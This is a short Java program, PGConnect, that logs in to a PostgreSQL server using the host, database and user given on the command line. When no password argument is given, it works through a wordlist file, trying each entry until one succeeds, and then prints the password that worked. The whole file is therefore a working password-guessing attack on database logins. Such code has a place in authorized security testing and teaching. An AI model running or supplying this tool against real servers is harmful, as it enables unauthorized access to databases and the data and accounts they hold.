//
import java.net.*;
import java.io.*;
import java.sql.*;
import java.util.Properties;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class PGConnect {

   public static void main(String[] args) throws IOException {
     Connection con = null;

     if (args.length < 3) {
       System.err.println("Usage: java -cp .:postgres_driver.jar PGConnect <host> <dbname> <user> [<pwd>]");
       System.exit(1);
     }
     try {
       //
       Class.forName("org.postgresql.Driver");
     } catch(Exception e) {
       System.err.println("Cannot find the driver.");
       System.exit(1);
     }
     String url = "jdbc:postgresql://" + args[0] + "/" + args[1];
     Properties props = new Properties();
     props.setProperty("user", args[2]);
     if (args.length == 4) {
       try {
         props.setProperty("password", args[3]);
         con = DriverManager.getConnection(url, props);
         System.err.println("Successfully connected to the database as "
                            + args[2] + "/" + args[3]);
         con.close();
       } catch (Exception e) {
         System.err.println("Attempt failed");
         System.exit(1);
       }
     } else {
       try (BufferedReader br = new BufferedReader(
                         new FileReader("password_list.txt"))) {
         String  line;
         boolean connected = false;
         int     cnt = 0;

         while (!connected && (line = br.readLine()) != null) {
           props.setProperty("password", line);
           try {
             con = DriverManager.getConnection(url, props);
             System.err.println("Successfully connected to the database as "
                            + args[2] + "/" + line);
             connected = true;
             con.close();
           } catch (Exception e) {
             // Ignore
           }
           cnt++;
           if (cnt % 100 == 0) {
             System.out.println(cnt + " passwords tried ...");
           }
         }
       }
     }
  }
}

